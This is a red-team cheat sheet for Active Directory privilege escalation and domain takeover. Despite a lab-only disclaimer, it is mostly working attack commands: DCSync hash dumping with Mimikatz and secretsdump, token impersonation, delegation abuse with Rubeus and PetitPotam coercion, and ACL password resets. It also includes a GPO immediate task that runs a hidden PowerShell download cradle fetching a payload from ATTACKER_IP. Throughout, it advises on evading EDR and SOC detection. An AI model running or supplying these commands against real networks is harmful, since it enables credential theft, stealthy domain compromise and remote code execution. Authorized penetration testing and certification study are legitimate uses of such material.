
# ⬆️ Privilege Escalation & Domain Dominance (Advanced Red Team )

> **For lab environments, authorized penetration testing, and CRTP preparation only.**
> 
> _Focus: EDR Evasion, OPSEC, Native API Abuse, and Minimal Disk Footprint._

---

## 1. DCSync (Directory Replication Service Remote Protocol)

_Goal: Replicate password hashes directly from the DC. Requires `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`._

> **OPSEC Warning:** Standard DCSync from a random workstation triggers immediate SOC alerts (Event ID 4662). Ideally, execute this from a compromised Exchange server or an existing Domain Controller where replication traffic is expected.



```powershell
# [In-Memory] Execute DCSync without dropping Mimikatz to disk (using reflection)
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:domain.local /user:krbtgt"'

# [Impacket] Remote DCSync using AES keys instead of plaintext passwords to avoid Logon Type 3 NTLM alerts
secretsdump.py domain.local/Administrator@DC_IP -aesKey <AES256_KEY> -just-dc-user krbtgt
```

---

## 2. Advanced Token Impersonation (LUID Manipulation)

_Goal: Steal a highly privileged access token from an existing process without logging off or dumping credentials._


```powershell
# [Native LotL] Enumerate available tokens on the compromised host
Invoke-TokenManipulation -Enumerate

# [Native LotL] Impersonate a specific user (e.g., Domain Admin) without dropping Mimikatz
Invoke-TokenManipulation -ImpersonateUser -Username "DOMAIN\Administrator"

# Revert to original process token
Invoke-TokenManipulation -RevToSelf
```

---

## 3. Constrained Delegation Abuse (S4U2Self & S4U2Proxy)

_Goal: Abuse an account trusted for delegation to impersonate ANY user to a specified service._


```powershell
# [OPSEC] Enumerate delegated accounts natively using PowerView
Get-DomainUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto

# Execute S4U attack using AES-256 (Never use RC4 /rc4:HASH as it triggers EDR alerts)
.\Rubeus.exe s4u /user:svcAccount /aes256:AES_KEY /impersonateuser:Administrator /msdsspn:cifs/target.domain.local /ptt
```

---

## 4. Unconstrained Delegation & Coerced Authentication

_Goal: Force a high-privilege account (like a Domain Controller) to authenticate to a machine you control, capturing its TGT._



```PowerShell
# Enumerate Unconstrained Delegation hosts natively
Get-DomainComputer -Unconstrained | Select-Object name

# Step 1: Start listening for incoming TGTs in memory
.\Rubeus.exe monitor /interval:5 /nowrap

# Step 2: Coerce the DC to authenticate to your controlled host. 
# Avoid SpoolSample.exe. Use PetitPotam (MS-EFSR) or native PowerShell RPC calls.
Invoke-PetitPotam -CaptureServer <ATTACKER_IP> -Target <DC_IP>
```

---

## 5. Active Directory ACL & GPO Abuse

_Goal: Exploit misconfigured permissions (Discretionary Access Control Lists) to elevate privileges stealthily._



```PowerShell
# [GenericAll / ForceChangePassword] Stealthy password reset
Set-DomainUserPassword -Identity targetuser -AccountPassword "HackerPass123!"

# [GenericWrite] Targeted Kerberoasting: Add a fake SPN to a user you have write access to
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='hacker/target'}
# Now you can Kerberoast this user!

# [GPO Abuse] If you have GenericAll/WriteProperty on a GPO, deploy a malicious Immediate Task
New-GPOImmediateTask -TaskName "Update" -Command "powershell.exe" -CommandArguments "-nop -w hidden -c iex(iwr http://ATTACKER_IP/payload.ps1 -UseBasicParsing).Content" -TargetGpoName "AppLocker Policy"
```

---

## 6. Real-World APT Attack Path (CRTP Execution)

Plaintext

```
[Initial Foothold] ➔ Low Privilege Domain User
       │
       ▼
[Recon & Enumeration] ➔ ADSI / PowerView / BloodHound (Identify Misconfigurations)
       │
       ▼
[Targeted Kerberoasting] ➔ Extract SPN Hash ➔ Offline Crack (Hashcat)
       │
       ▼
[Lateral Movement] ➔ DCOM/WinRM into compromised Service Account's Host
       │
       ▼
[Local PrivEsc] ➔ Bypass AppLocker via Writeable Directory ➔ Extract Local Credentials (LSASS)
       │
       ▼
[Domain PrivEsc] ➔ Discover Unconstrained Delegation / GPO Write Access
       │
       ▼
[Domain Dominance] ➔ Coerce DC Auth ➔ Capture TGT ➔ DCSync (krbtgt extraction)
       │
       ▼
[Persistence] ➔ AES-256 Golden Ticket / DSRM Password Sync 🏁
```

---

## 🛡️ OPSEC Notes & Telemetry Matrix

|**Technique**|**Detection Risk**|**Artifact Left / EDR Telemetry**|
|---|---|---|
|**DCSync (from Workstation)**|**Critical**|Event 4662 (Directory Service Access) from non-DC IPs.|
|**Token Impersonation**|**Medium**|Process injection anomalies. Use native Win32 API calls (`LogonUser`) where possible.|
|**S4U Delegation (RC4)**|**High**|Ticket Encryption Type `0x17` (RC4) stands out. Always use AES (`0x12`).|
|**Print Spooler (MS-RPRN)**|**High**|Event 5145. Print Spooler service is heavily monitored. Use MS-EFSR (PetitPotam) instead.|
|**GPO Modification**|**Medium**|Event 5136 (Directory Service Changes). Blends with sysadmin activity if done carefully.|

---

_Created for Active Directory Red Teaming Operations._